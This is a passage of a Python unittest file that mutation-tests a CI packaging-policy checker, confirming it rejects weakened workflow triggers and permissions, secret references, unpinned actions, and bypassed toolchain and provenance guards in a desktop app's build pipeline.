from __future__ import annotations

import copy
import hashlib
import importlib.util
import os
import shutil
import subprocess
import sys
import tempfile
import textwrap
import unittest
from contextlib import ExitStack, contextmanager
from pathlib import Path
from unittest import mock


ROOT = Path(__file__).resolve().parents[2]
SCRIPT = ROOT / "tools" / "check_packaged_smoke_policy.py"
SPEC = importlib.util.spec_from_file_location("check_packaged_smoke_policy", SCRIPT)
assert SPEC is not None and SPEC.loader is not None
CHECKER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CHECKER)


def inputs() -> dict[str, object]:
    return CHECKER.load_inputs()


def changed(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    if old not in value:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value.replace(old, new, 1)


def changed_all(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    if old not in value:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value.replace(old, new)


def changed_last(current: dict[str, object], key: str, old: str, new: str) -> None:
    value = str(current[key])
    offset = value.rfind(old)
    if offset < 0:
        raise AssertionError(f"fixture marker missing: {old!r}")
    current[key] = value[:offset] + new + value[offset + len(old) :]


@contextmanager
def synchronized_workflow_summary(current: dict[str, object]):
    workflow = str(current["workflow"])
    run_digests = tuple(
        (f"mutated-run-{index}", hashlib.sha256(block.encode("utf-8")).hexdigest())
        for index, block in enumerate(CHECKER._run_blocks(workflow))
    )
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    reviewed["workflow"] = CHECKER._reviewed_input_digest(workflow)
    with mock.patch.object(
        CHECKER,
        "EXPECTED_WORKFLOW_SHA256",
        hashlib.sha256(workflow.encode("utf-8")).hexdigest(),
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_RUN_BLOCK_SHA256",
        run_digests,
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_REVIEWED_INPUT_SHA256",
        reviewed,
    ):
        yield


@contextmanager
def synchronized_formal_workflow_summary(current: dict[str, object]):
    workflow = str(current["formal_workflow"])
    expected_hashes = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
    expected_hashes["formal workflow"] = hashlib.sha256(
        workflow.encode("utf-8")
    ).hexdigest()
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    reviewed["formal_workflow"] = CHECKER._reviewed_input_digest(workflow)
    with mock.patch.object(
        CHECKER,
        "EXPECTED_FORMAL_BOUNDARY_SHA256",
        expected_hashes,
    ), mock.patch.object(
        CHECKER,
        "EXPECTED_REVIEWED_INPUT_SHA256",
        reviewed,
    ):
        yield


@contextmanager
def synchronized_reviewed_input_summaries(
    current: dict[str, object],
    *keys: str,
):
    expected = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    for key in keys:
        expected[key] = CHECKER._reviewed_input_digest(current[key])
    with mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", expected):
        yield


@contextmanager
def synchronized_input_document_summaries(
    current: dict[str, object],
    *keys: str,
):
    legacy_constants = {
        "common_audit": "EXPECTED_COMMON_AUDIT_SHA256",
        "prepare": "EXPECTED_PREPARE_SHA256",
        "bundle_audit": "EXPECTED_BUNDLE_AUDIT_SHA256",
        "before_pack": "EXPECTED_BEFORE_PACK_SHA256",
        "after_pack": "EXPECTED_AFTER_PACK_SHA256",
    }
    formal_labels = {
        "formal_base_config": "formal base config",
        "formal_release_config": "formal release config",
        "formal_before_pack": "formal beforePack",
        "formal_after_pack": "formal afterPack",
        "formal_prepare_release": "formal prepareRelease",
        "formal_reseal": "formal runtime reseal",
        "formal_release_policy_tests": "formal release policy tests",
    }
    reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
    formal = dict(CHECKER.EXPECTED_FORMAL_BOUNDARY_SHA256)
    with ExitStack() as stack:
        for key in keys:
            digest = CHECKER._reviewed_input_digest(current[key])
            reviewed[key] = digest
            if key in legacy_constants:
                stack.enter_context(
                    mock.patch.object(CHECKER, legacy_constants[key], digest)
                )
            label = formal_labels.get(key)
            if label is not None and label in formal:
                formal[label] = digest
        stack.enter_context(
            mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", reviewed)
        )
        stack.enter_context(
            mock.patch.object(CHECKER, "EXPECTED_FORMAL_BOUNDARY_SHA256", formal)
        )
        yield


def replace_make_target(
    current: dict[str, object],
    target: str,
    replacement: str,
) -> None:
    makefile = str(current["makefile"])
    start = makefile.index(f"{target}:")
    following = makefile.find("\n\n", start)
    if following < 0:
        raise AssertionError(f"Make target terminator missing: {target}")
    current["makefile"] = makefile[:start] + replacement + makefile[following:]


def wrap_python_statement_block(
    current: dict[str, object],
    start_marker: str,
    end_marker: str,
    wrapper: str,
) -> None:
    source = str(current["python_bootstrap"])
    marker_offset = source.index(start_marker)
    block_start = source.rfind("\n", 0, marker_offset) + 1
    end_offset = source.index(end_marker, marker_offset)
    block_end = source.rfind("\n", 0, end_offset) + 1
    indentation = source[block_start:marker_offset]
    block = source[block_start:block_end]
    current["python_bootstrap"] = (
        source[:block_start]
        + f"{indentation}{wrapper}\n"
        + textwrap.indent(block, "    ")
        + source[block_end:]
    )


class PackagedSmokePolicyTests(unittest.TestCase):
    def test_current_engineering_smoke_boundary_is_consistent(self) -> None:
        self.assertEqual(CHECKER.validate_policy(inputs()), [])

    def test_policy_input_universe_is_closed(self) -> None:
        current = inputs()
        self.assertEqual(
            set(current),
            {
                "workflow",
                "makefile",
                "build_script",
                "audit_script",
                "python_bootstrap",
                "framework_verifier",
                "framework_verifier_tests",
                "framework_inventory_generator",
                "framework_inventory",
                "exact_git_checker",
                "exact_git_checker_tests",
                "exact_node_installer",
                "python_packaging_tests",
                "gitignore",
                "remediation_evidence",
                "package",
                "desktop_package_lock",
                "web_package",
                "web_package_lock",
                "python_build_requirements_lock",
                "python_runtime_lock",
                "python_toolchain_lock",
                "pyinstaller_spec",
                "smoke_config",
                "common_audit",
                "prepare",
                "desktop_entrypoint_builder",
                "renderer_builder",
                "stage_renderer",
                "audit_renderer",
                "engineering_packaging_tests",
                "before_pack_tests",
                "renderer_packaging_tests",
                "before_pack",
                "after_pack",
                "bundle_audit",
                "schema",
                "renderer_schema",
                "python_sidecar_schema",
                "formal_base_config",
                "formal_release_config",
                "formal_before_pack",
                "formal_after_pack",
                "formal_prepare_release",
                "formal_reseal",
                "formal_release_policy_tests",
                "formal_workflow",
                "status",
                "todo",
                "trace",
                "iteration",
            },
        )
        del current["bundle_audit"]
        self.assertIn(
            "packaged-smoke policy input set drifted",
            CHECKER.validate_policy(current),
        )

        reviewed = dict(CHECKER.EXPECTED_REVIEWED_INPUT_SHA256)
        del reviewed["python_bootstrap"]
        with mock.patch.object(CHECKER, "EXPECTED_REVIEWED_INPUT_SHA256", reviewed):
            self.assertIn(
                "packaged-smoke policy input set drifted",
                CHECKER.validate_policy(inputs()),
            )

    def test_dispatch_tag_and_pull_request_target_triggers_fail(self) -> None:
        for trigger in ("  workflow_dispatch:\n", "  pull_request_target:\n", "    tags:\n"):
            with self.subTest(trigger=trigger.strip()):
                current = inputs()
                changed(current, "workflow", "concurrency:\n", trigger + "\nconcurrency:\n")
                self.assertTrue(
                    any("trigger" in error or "forbidden control" in error for error in CHECKER.validate_policy(current))
                )

    def test_duplicate_top_level_keys_and_step_skip_controls_fail(self) -> None:
        current = inputs()
        current["workflow"] = str(current["workflow"]) + "\njobs: {}\n"
        self.assertTrue(any("top-level key" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n        if: false",
        )
        self.assertTrue(any("repository guard" in error for error in CHECKER.validate_policy(current)))

        current = inputs()
        changed(current, "workflow", "        shell: bash", "        shell: python")
        self.assertTrue(any("shell selection" in error for error in CHECKER.validate_policy(current)))

    def test_push_must_remain_main_only(self) -> None:
        current = inputs()
        changed(current, "workflow", "      - main\n", "      - '**'\n")
        self.assertIn(
            "workflow triggers must be exactly pull_request plus main push",
            CHECKER.validate_policy(current),
        )

    def test_permissions_environment_and_secrets_fail(self) -> None:
        mutations = (
            ("contents: read", "contents: write", "write permissions"),
            ("contents: read", "contents: read\n  issues: write", "permissions"),
            ("    runs-on: macos-15", "    environment: macos-signing\n    runs-on: macos-15", "Environment"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets.BAD }}\n      CI: \"true\"", "GitHub secrets"),
            ("      CI: \"true\"", "      TOKEN: ${{ secrets['BAD'] }}\n      CI: \"true\"", "GitHub secrets"),
        )
        for old, new, expected in mutations:
            with self.subTest(expected=expected):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertTrue(any(expected in error for error in CHECKER.validate_policy(current)))

    def test_actions_must_be_full_sha_pinned_and_allowlisted(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.CHECKOUT_SHA, "v6")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("action" in error for error in errors))

    def test_checkout_and_source_sha_cannot_fall_back_to_pr_merge(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            f"LCF_SOURCE_SHA: {CHECKER.SOURCE_EXPRESSION}",
            "LCF_SOURCE_SHA: ${{ github.sha }}",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_unified_provenance_checker_is_the_only_workflow_git_gate(self) -> None:
        mutations = (
            (
                '"${bootstrap_python}" -I -S tools/check_exact_git_provenance.py \\\n'
                '              --emit-github-env > "${provenance_env}"',
                "git rev-parse --verify HEAD",
            ),
            (
                '"${LCF_REVIEWED_BUILD_PYTHON}" -I -S \\\n'
                "            tools/check_exact_git_provenance.py > /dev/null",
                "true",
            ),
            (
                textwrap.indent(CHECKER.EXPECTED_POLICY_RUN, "          "),
                textwrap.indent(
                    CHECKER.EXPECTED_POLICY_RUN.replace(
                        'cd "${LCF_REVIEWED_SOURCE_ROOT}"\n',
                        'cd "${LCF_REVIEWED_SOURCE_ROOT}"\n'
                        "git status --porcelain=v1\n",
                        1,
                    ),
                    "          ",
                ),
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "git" in error.lower()
                        or "provenance" in error.lower()
                        or "critical step" in error.lower()
                        or "run-step" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

    def test_all_repo_owned_commands_run_from_the_private_exact_source(self) -> None:
        for key, old, new, expected in (
            (
                "workflow",
                "      - name: Enforce engineering-smoke packaging policy\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${LCF_REVIEWED_SOURCE_ROOT}"',
                "      - name: Enforce engineering-smoke packaging policy\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${RUNNER_TEMP}"',
                "workflow repo-owned command escaped",
            ),
            (
                "workflow",
                "      - name: Build and stage audited renderer\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${LCF_REVIEWED_SOURCE_ROOT}"',
                "      - name: Build and stage audited renderer\n"
                "        shell: bash\n"
                "        run: |\n"
                "          set -euo pipefail\n"
                '          cd "${RUNNER_TEMP}"',
                "workflow repo-owned command escaped",
            ),
            (
                "formal_workflow",
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
                "        run: make python-sidecar-build",
                "formal repo-owned command escaped",
            ),
        ):
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                context = (
                    synchronized_workflow_summary(current)
                    if key == "workflow"
                    else synchronized_formal_workflow_summary(current)
                )
                with context:
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

    def test_private_exact_source_bootstrap_is_semantic(self) -> None:
        for old, new in (
            (
                'readonly canonical_repository_url="https://github.com/fredgnr/local-context-forge.git"',
                'readonly canonical_repository_url="https://example.invalid/unreviewed.git"',
            ),
            (
                'chmod 0700 "${reviewed_source}"',
                'chmod 0755 "${reviewed_source}"',
            ),
            (
                "          git_bootstrap() {\n"
                "            /usr/bin/env -i \\\n",
                "          git_bootstrap() {\n"
                "            /usr/bin/env \\\n",
            ),
            (
                '"+${LCF_SOURCE_SHA}:${reviewed_source_ref}"',
                '"+${GITHUB_SHA}:${reviewed_source_ref}"',
            ),
            (
                'git_private checkout --quiet --detach "${reviewed_source_ref}"',
                'git checkout --quiet --detach "${reviewed_source_ref}"',
            ),
            (
                'test "$(wc -l < "${provenance_env}")" -eq 5',
                "true",
            ),
            (
                "printf 'LCF_REVIEWED_SOURCE_ROOT=%s\\n' \\\n",
                "printf 'UNREVIEWED_SOURCE_ROOT=%s\\n' \\\n",
            ),
        ):
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "private exact-source bootstrap" in error
                        or "GITHUB_ENV" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_build_script_tests_ignore_and_nogo_evidence_are_bound_inputs(self) -> None:
        current = inputs()
        current["build_script"] = str(current["build_script"]) + "\nGITHUB_SHA\n"
        with synchronized_reviewed_input_summaries(current, "build_script"):
            self.assertIn(
                "Python sidecar provenance must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        changed(
            current,
            "exact_git_checker",
            'commit = environment.get("LCF_SOURCE_SHA", "").lower()',
            'commit = environment.get("LCF_SOURCE_SHA", environment.get("GITHUB_SHA", "")).lower()',
        )
        with synchronized_reviewed_input_summaries(current, "exact_git_checker"):
            self.assertIn(
                "exact Git provenance checker must not fall back to GITHUB_SHA",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["build_script"] = str(current["build_script"]).replace(
            '"core.attributesFile=/dev/null",',
            '"core.attributesFile=unreviewed",',
            1,
        )
        with synchronized_reviewed_input_summaries(current, "build_script"):
            self.assertIn(
                "Python sidecar Git provenance isolation missing 'core.attributesFile=/dev/null'",
                CHECKER.validate_policy(current),
            )

        current = inputs()
        current["python_packaging_tests"] = str(
            current["python_packaging_tests"]
        ).replace("LCF_SOURCE_TREE", "LCF_SOURCE_TR33")
        with synchronized_reviewed_input_summaries(
            current,
            "python_packaging_tests",
        ):
            self.assertTrue(
                any(
                    "provenance tests" in error
                    for error in CHECKER.validate_policy(current)
                )
            )

        current = inputs()
        changed(
            current,
            "gitignore",
            "desktop/generated/python-sidecar-build-*/",
            "desktop/generated/",
        )
        with synchronized_reviewed_input_summaries(current, "gitignore"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("scratch ignore" in error for error in errors), errors)

        current = inputs()
        changed(
            current,
            "remediation_evidence",
            "decision=NO-GO",
            "decision=GO",
        )
        with synchronized_reviewed_input_summaries(
            current,
            "remediation_evidence",
        ):
            self.assertTrue(
                any(
                    "remediation evidence" in error
                    for error in CHECKER.validate_policy(current)
                )
            )

        current = inputs()
        changed(current, "workflow", "persist-credentials: false", "persist-credentials: true")
        errors = CHECKER.validate_policy(current)
        self.assertTrue(any("exact-source" in error for error in errors))

    def test_reviewed_builder_test_and_schema_inputs_cannot_be_dropped(self) -> None:
        for key in (
            "audit_script",
            "python_bootstrap",
            "python_build_requirements_lock",
            "python_runtime_lock",
            "python_toolchain_lock",
            "pyinstaller_spec",
            "exact_git_checker",
            "exact_git_checker_tests",
            "exact_node_installer",
            "desktop_package_lock",
            "desktop_entrypoint_builder",
            "renderer_builder",
            "stage_renderer",
            "audit_renderer",
            "engineering_packaging_tests",
            "before_pack_tests",
            "renderer_packaging_tests",
            "renderer_schema",
            "python_sidecar_schema",
            "formal_prepare_release",
            "formal_reseal",
            "formal_release_policy_tests",
        ):
            with self.subTest(key=key):
                current = inputs()
                del current[key]
                self.assertEqual(
                    CHECKER.validate_policy(current),
                    ["packaged-smoke policy input set drifted"],
                )

    def test_renderer_lock_uses_the_reviewed_blob_and_exact_fixed_env_keys(self) -> None:
        helper_mutations = (
            (
                "package_lock_bytes = sidecar._git_bytes(\n"
                '        "cat-file", "blob", package_lock_entry.object_id\n'
                "    )",
                'package_lock_bytes = Path("web/package-lock.json").read_bytes()',
                "exact Git provenance checker missing",
            ),
            (
                "selected_package_lock != renderer_package_lock_sha256",
                "False",
                "exact Git provenance checker missing",
            ),
            (
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                "",
                "fixed output key set",
            ),
            (
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                '        print("LCF_UNREVIEWED=1")\n'
                '        print(\n'
                '            "LCF_RENDERER_PACKAGE_LOCK_SHA256="\n'
                '            f"{result[\'rendererPackageLockSha256\']}"\n'
                "        )",
                "fixed output key set",
            ),
        )
        for old, new, expected in helper_mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "exact_git_checker", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "exact_git_checker",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

        current = inputs()
        lock = str(current["web_package_lock"]).replace(
            '"node_modules/vite": {\n      "version": "7.3.6"',
            '"node_modules/vite": {\n      "version": "0.0.0"',
            1,
        )
        if lock == current["web_package_lock"]:
            self.fail("web package lock fixture marker missing")
        current["web_package_lock"] = lock
        with synchronized_input_document_summaries(current, "web_package_lock"):
            errors = CHECKER.validate_policy(current)
        self.assertIn("reviewed renderer package lock contract drifted", errors)

    def test_exact_node_install_and_toolchain_values_are_semantic(self) -> None:
        mutations = (
            (
                "exact_node_installer",
                'const EXPECTED_NODE_VERSION = "v22.23.2";',
                'const EXPECTED_NODE_VERSION = "v23.0.0";',
            ),
            (
                "exact_node_installer",
                'const EXPECTED_NPM_VERSION = "10.9.8";',
                'const EXPECTED_NPM_VERSION = "11.17.0";',
            ),
            (
                "exact_node_installer",
                "!runtimeContract.allowExternalNpmForTest &&",
                "false &&",
            ),
            (
                "exact_node_installer",
                'const userConfig = path.join(temporaryHome, "user.npmrc");',
                "const userConfig = globalConfig;",
            ),
            (
                "exact_node_installer",
                "resolvedReal = fs.realpathSync.native(candidate);",
                "resolvedReal = path.resolve(candidate);",
            ),
            (
                "exact_node_installer",
                '} else if (record.type === "directory") {\n      content.mode = record.mode;',
                '} else if (record.type === "directory") {\n      delete content.mode;',
            ),
            (
                "engineering_packaging_tests",
                "rejects an npm executable outside the selected Node runtime before execution",
                "allows an external npm executable",
            ),
            (
                "engineering_packaging_tests",
                "fails the final install postcheck before an artifact can be accepted",
                "accepts an artifact before the final install postcheck",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any("exact Node" in error for error in errors), errors)

        for key in ("common_audit", "prepare", "stage_renderer", "audit_renderer"):
            with self.subTest(consumer=key):
                current = inputs()
                changed(current, key, '"v22.23.2"', '"v23.0.0"')
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any("exact Node toolchain value" in error for error in errors),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        schema["properties"]["components"]["properties"]["desktopApp"][
            "properties"
        ]["entrypointBuild"]["properties"]["nodeVersion"]["const"] = "v23.0.0"
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("manifest schema" in error for error in errors), errors)

        current = inputs()
        schema = copy.deepcopy(current["renderer_schema"])
        schema["properties"]["builder"]["properties"]["npmVersion"][
            "const"
        ] = "11.17.0"
        current["renderer_schema"] = schema
        with synchronized_input_document_summaries(current, "renderer_schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("renderer manifest schema" in error for error in errors),
            errors,
        )

    def test_python_exact_toolchain_bootstrap_and_evidence_are_semantic(self) -> None:
        mutations = (
            (
                "python_bootstrap",
                '"--require-hashes"',
                '"--no-deps"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "build._validate_repository_state(",
                "build._repository_tree_inventory(",
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"LCF_PYTHON_BUILD_VENV_FD"',
                '"LCF_PYTHON_BUILD_VENV_PATH"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "_make_installed_tree_cleanup_writable(descriptor)",
                "pass",
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"tools/build_python_sidecar.py"',
                '"tools/unreviewed_builder.py"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                'INSTALLER_ROOT_PREFIX = "lcf-python-installer."',
                'INSTALLER_ROOT_PREFIX = "unbounded-installer-"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"/usr/sbin/pkgutil"',
                '"/usr/bin/true"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                '"/usr/sbin/spctl"',
                '"/usr/bin/true"',
                "exact Python toolchain bootstrap",
            ),
            (
                "python_bootstrap",
                "build._exchange_at(",
                "os.replace(",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "if mode & 0o022:",
                "if False:",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "before.st_nlink != 1\n                    or before.st_size > MAX_TREE_FILE_BYTES",
                "False\n                    or before.st_size > MAX_TREE_FILE_BYTES",
                "producer privatization",
            ),
            (
                "python_bootstrap",
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "pass",
                "producer privatization",
            ),
            (
                "python_packaging_tests",
                "test_reviewed_python_distribution_audit_failure_never_runs_observer",
                "removed_distribution_audit_failure_fixture",
                "exact Python toolchain tests",
            ),
            (
                "python_packaging_tests",
                "test_installed_tree_privatization_exchange_failure_removes_private_copy",
                "removed_privatization_exchange_failure_fixture",
                "exact Python toolchain tests",
            ),
            (
                "python_packaging_tests",
                "test_exact_toolchain_build_failure_cleans_root",
                "removed_toolchain_failure_cleanup_fixture",
                "exact Python toolchain tests",
            ),
            (
                "build_script",
                "bootstrap.verify_toolchain_environment(environment)",
                "None",
                "Python inner builder toolchain evidence",
            ),
            (
                "audit_script",
                "def _validate_toolchain_evidence_artifact(",
                "def _ignore_toolchain_evidence_artifact(",
                "standalone Python auditor toolchain evidence",
            ),
        )
        for key, old, new, expected in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(any(expected in error for error in errors), errors)

        current = inputs()
        schema = copy.deepcopy(current["python_sidecar_schema"])
        schema["$defs"]["pythonToolchain"]["required"].remove(
            "installedTreeContentSha256"
        )
        current["python_sidecar_schema"] = schema
        with synchronized_input_document_summaries(current, "python_sidecar_schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("Python sidecar manifest schema" in error for error in errors),
            errors,
        )

    def test_python_producer_privatization_ast_rejects_dead_code(self) -> None:
        mutations = (
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "(_privatize_installed_tree(bootstrap_root, bootstrap_fd, build) if False else None)",
            ),
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "if 1 == 0:\n"
                "                    _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            ),
            (
                "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
                "for _unused in ():\n"
                "                    _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            ),
            (
                "        with build._defer_publish_signals():\n"
                "            build._exchange_at(",
                "        with build._defer_publish_signals():\n"
                "            if False:\n"
                "                build._exchange_at(",
            ),
            (
                "raise ToolchainBootstrapError(\n"
                '                                "Installed toolchain producer hardlink is writable"',
                "_ignored = ToolchainBootstrapError(\n"
                '                                "Installed toolchain producer hardlink is writable"',
            ),
            (
                "before.st_nlink != 1\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
                "(before.st_nlink != 1 and False)\n"
                "                    or before.st_size > MAX_TREE_FILE_BYTES",
            ),
            (
                "if before.st_nlink != 1:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
                "if before.st_nlink != 1 and False:\n"
                '                    raise ToolchainBootstrapError("Installed toolchain hardlink is forbidden")',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "python_bootstrap",
            "_privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
            "return None\n"
            "                _privatize_installed_tree(bootstrap_root, bootstrap_fd, build)",
        )
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python toolchain producer privatization AST closure drifted",
            errors,
        )

    def test_python_outer_uv_capability_ast_rejects_weakened_cleanup(self) -> None:
        mutations = (
            (
                "preserve_error=runtime_error",
                "preserve_error=None",
            ),
            (
                "capability_error = capability_error or exc",
                "capability_error = exc",
            ),
            (
                "cwd_descriptor=backend_fd",
                "cwd_descriptor=source.descriptor",
            ),
            (
                ") from capability_error\n"
                "                if runtime_error is not None:",
                ") from runtime_error\n"
                "                if runtime_error is not None:",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain producer privatization AST closure drifted",
                    errors,
                )

    def test_held_cwd_launcher_and_canonical_runner_mutations_are_rejected(
        self,
    ) -> None:
        launcher_mutations = (
            ("os.fchdir(cwd_fd)", 'os.chdir("/")'),
            ("signal.SIG_UNBLOCK", "signal.SIG_BLOCK"),
            (
                "os.execve(target, target_arguments, dict(os.environ))",
                "os.execv(target, target_arguments)",
            ),
            (
                "cwd_descriptor=source.descriptor",
                "cwd_descriptor=build_fd",
            ),
        )
        for old, new in launcher_mutations:
            with self.subTest(launcher=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "exact Python toolchain bootstrap" in error
                        or "exact Python held-cwd launcher" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        bootstrap = str(current["python_bootstrap"])
        prefix, separator, suffix = bootstrap.rpartition("signal.SIG_UNBLOCK")
        self.assertEqual(separator, "signal.SIG_UNBLOCK")
        current["python_bootstrap"] = prefix + "signal.SIG_BLOCK" + suffix
        with synchronized_input_document_summaries(current, "python_bootstrap"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "exact Python held-cwd launcher signal contract drifted",
            errors,
        )

        canonical_runner_mutations = (
            (
                "source_root = os.path.abspath(os.path.normpath(sys.argv.pop(1)))",
                'source_root = "/dev/fd/" + str(source_descriptor)',
            ),
            (
                "os.lstat(capability_root)",
                "os.stat(capability_root)",
            ),
            (
                "os.set_inheritable(capability_descriptor, False)",
                "os.set_inheritable(capability_descriptor, True)",
            ),
            (
                'os.environ["LCF_PYINSTALLER_SOURCE_ROOT"] = source_root',
                'os.environ["LCF_PYINSTALLER_SOURCE_ROOT"] = "/dev/fd/" + str(source_descriptor)',
            ),
        )
        for old, new in canonical_runner_mutations:
            with self.subTest(canonical_runner=old):
                current = inputs()
                changed(current, "build_script", old, new)
                with synchronized_input_document_summaries(current, "build_script"):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "PyInstaller canonical capability runner" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_runtime_bootstrap_cannot_regain_installer_or_rebind_authority(
        self,
    ) -> None:
        forbidden_markers = (
            "/usr/sbin/installer",
            "/usr/bin/sudo",
            "_run_reviewed_framework_installer",
            "_seal_reviewed_framework_permissions",
            "LAUNCHER_NAME_INSTALLER_PENDING_SEAL",
            "LAUNCHER_NAME_INSTALLER_REBIND",
        )
        for marker in forbidden_markers:
            with self.subTest(marker=marker):
                current = inputs()
                current["python_bootstrap"] = (
                    str(current["python_bootstrap"]) + f"\n# forbidden: {marker}\n"
                )
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

    def test_locked_active_launcher_check_directly_dominates_observer_use(
        self,
    ) -> None:
        active_guard = (
            "                if active_launcher != interpreter:\n"
            "                    raise ToolchainBootstrapError(\n"
            '                        "Reviewed Python installer launcher is not the locked interpreter"\n'
            "                    )\n"
        )
        for replacement in (
            "                if active_launcher != interpreter:\n"
            "                    pass\n",
            "                if False:\n" + textwrap.indent(active_guard, "    "),
        ):
            with self.subTest(replacement=replacement):
                current = inputs()
                changed(
                    current,
                    "python_bootstrap",
                    active_guard,
                    replacement,
                )
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact reviewed Python framework security closure drifted",
                    errors,
                )

        current = inputs()
